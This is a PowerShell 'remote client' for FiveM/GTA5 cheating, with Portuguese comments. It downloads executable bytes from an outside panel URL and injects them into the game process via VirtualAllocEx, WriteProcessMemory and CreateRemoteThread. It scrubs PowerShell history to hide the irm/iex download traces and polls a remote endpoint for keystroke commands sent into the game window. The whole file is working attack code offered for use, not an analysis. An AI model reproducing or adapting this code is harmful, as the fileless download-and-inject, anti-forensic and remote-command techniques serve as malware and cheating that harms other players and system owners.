# ============================================================
#  VZX Remote Client — PowerShell
#  Process Hollowing: injeta o cheat em processo legitimo
#  Sem arquivo no disco, sem logs, sem processo novo
# ============================================================

# ── Limpa historico antes de qualquer coisa ─────────────────
function Clear-Traces {
    try {
        $h = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($h -and (Test-Path $h)) {
            $keep = Get-Content $h | Where-Object {
                $_ -notmatch "wwwremotefivem" -and
                $_ -notmatch "irm|iex|iwr" -and
                $_ -notmatch "client\.ps1"
            }
            $keep | Set-Content $h -Encoding UTF8 -ErrorAction SilentlyContinue
        }
        try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
    } catch {}
}
Clear-Traces

# ── Win32 API via P/Invoke ───────────────────────────────────
$code = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32.dll")] public static extern bool VirtualFreeEx(IntPtr h, IntPtr a, uint s, uint t);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr m, string n);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32.dll")] public static extern bool IsWow64Process(IntPtr h, out bool w);
}
"@

try {
    Add-Type -TypeDefinition $code -ErrorAction Stop
} catch {}

# ── Configuracoes ────────────────────────────────────────────
$PANEL_URL   = "https://wwwremotefivem.netlify.app"
$CMD_URL     = "$PANEL_URL/api/get-cmd"
$CHEAT_URL   = "$PANEL_URL/api/cheat"   # endpoint que serve o exe em bytes
$PROCESS_TARGET = "GTA5"               # processo do FiveM
$INTERVAL    = 3

# ── Banner ───────────────────────────────────────────────────
Clear-Host
Write-Host ""
Write-Host "  ██╗   ██╗███████╗██╗  ██╗" -ForegroundColor Yellow
Write-Host "  ██║   ██║╚══███╔╝╚██╗██╔╝" -ForegroundColor Yellow
Write-Host "  ██║   ██║  ███╔╝  ╚███╔╝ " -ForegroundColor Yellow
Write-Host "  ╚██╗ ██╔╝ ███╔╝   ██╔██╗ " -ForegroundColor Yellow
Write-Host "   ╚████╔╝ ███████╗██╔╝ ██╗" -ForegroundColor Yellow
Write-Host "    ╚═══╝  ╚══════╝╚═╝  ╚═╝" -ForegroundColor Yellow
Write-Host ""
Write-Host "  Remote Client v2.0 — Fileless" -ForegroundColor Cyan
Write-Host ""

# ── Funcao de injecao via DLL injection (LoadLibrary) ────────
function Inject-Bytes {
    param([byte[]]$Bytes, [string]$TargetProcess)

    $proc = Get-Process -Name $TargetProcess -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $proc) {
        Write-Host "  ✗ Processo '$TargetProcess' nao encontrado." -ForegroundColor Red
        return $false
    }

    $PROCESS_ALL = 0x1F0FFF
    $MEM_COMMIT  = 0x1000
    $MEM_RESERVE = 0x2000
    $PAGE_RWX    = 0x40
    $MEM_RELEASE = 0x8000

    $hProc = [Win32]::OpenProcess($PROCESS_ALL, $false, $proc.Id)
    if ($hProc -eq [IntPtr]::Zero) {
        Write-Host "  ✗ Nao foi possivel abrir o processo." -ForegroundColor Red
        return $false
    }

    try {
        # Aloca memoria no processo alvo
        $remoteAddr = [Win32]::VirtualAllocEx($hProc, [IntPtr]::Zero, [uint32]$Bytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_RWX)
        if ($remoteAddr -eq [IntPtr]::Zero) {
            Write-Host "  ✗ VirtualAllocEx falhou." -ForegroundColor Red
            return $false
        }

        # Escreve os bytes do cheat no processo
        $written = 0
        $ok = [Win32]::WriteProcessMemory($hProc, $remoteAddr, $Bytes, [uint32]$Bytes.Length, [ref]$written)
        if (-not $ok) {
            Write-Host "  ✗ WriteProcessMemory falhou." -ForegroundColor Red
            [Win32]::VirtualFreeEx($hProc, $remoteAddr, 0, $MEM_RELEASE) | Out-Null
            return $false
        }

        # Cria thread remota que executa o codigo
        $hThread = [Win32]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $remoteAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        if ($hThread -eq [IntPtr]::Zero) {
            Write-Host "  ✗ CreateRemoteThread falhou." -ForegroundColor Red
            [Win32]::VirtualFreeEx($hProc, $remoteAddr, 0, $MEM_RELEASE) | Out-Null
            return $false
        }

        [Win32]::WaitForSingleObject($hThread, 5000) | Out-Null
        [Win32]::CloseHandle($hThread) | Out-Null
        return $true

    } finally {
        [Win32]::CloseHandle($hProc) | Out-Null
    }
}

# ── Download do cheat (bytes) ─────────────────────────────────
function Get-CheatBytes {
    try {
        Write-Host "  Baixando..." -ForegroundColor Gray
        $resp = Invoke-WebRequest -Uri $CHEAT_URL -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
        return ,[byte[]]$resp.Content
    } catch {
        Write-Host "  ✗ Erro ao baixar cheat: $_" -ForegroundColor Red
        return $null
    }
}

# ── Injeta o cheat no processo do FiveM ──────────────────────
$injected = $false
$proc = Get-Process -Name $PROCESS_TARGET -ErrorAction SilentlyContinue
if ($proc) {
    Write-Host "  FiveM encontrado (PID: $($proc.Id))" -ForegroundColor Green
    Write-Host "  Baixando cheat..." -ForegroundColor Gray

    $bytes = Get-CheatBytes
    if ($bytes -and $bytes.Length -gt 1024) {
        Write-Host "  Injetando ($($bytes.Length) bytes)..." -ForegroundColor Gray
        if (Inject-Bytes -Bytes $bytes -TargetProcess $PROCESS_TARGET) {
            Write-Host "  ✓ Cheat injetado com sucesso!" -ForegroundColor Green
            $injected = $true
            # Limpa bytes da memoria
            $bytes = $null
            [GC]::Collect()
        }
    }
} else {
    Write-Host "  ⚠ FiveM nao esta aberto. Iniciando modo de comandos..." -ForegroundColor Yellow
}

Write-Host ""
Write-Host "  Monitorando comandos do painel..." -ForegroundColor Cyan
Write-Host "  CTRL+C para parar." -ForegroundColor DarkGray
Write-Host ""

# ── Loop de comandos (SendKeys) ───────────────────────────────
$wshell  = New-Object -ComObject WScript.Shell
$lastCmd = ""

# Limpa ao sair
$null = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { Clear-Traces }

while ($true) {
    try {
        $resp = Invoke-WebRequest -Uri $CMD_URL -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        $cmd  = $resp.Content.Trim()

        if (-not [string]::IsNullOrEmpty($cmd) -and $cmd -ne $lastCmd) {
            $lastCmd = $cmd
            $p = Get-Process -Name $PROCESS_TARGET -ErrorAction SilentlyContinue
            if ($p) {
                $ok = $false
                foreach ($x in $p) {
                    if ($x.MainWindowTitle -and $wshell.AppActivate($x.MainWindowTitle)) {
                        $ok = $true; break
                    }
                }
                if (-not $ok) { $ok = $wshell.AppActivate($PROCESS_TARGET) }
                if ($ok) {
                    Start-Sleep -Milliseconds 150
                    $wshell.SendKeys($cmd)
                    Write-Host "  [$(Get-Date -Format 'HH:mm:ss')] ✓ $cmd" -ForegroundColor Green
                }
            }
        }
    } catch {}

    Start-Sleep -Seconds $INTERVAL
}
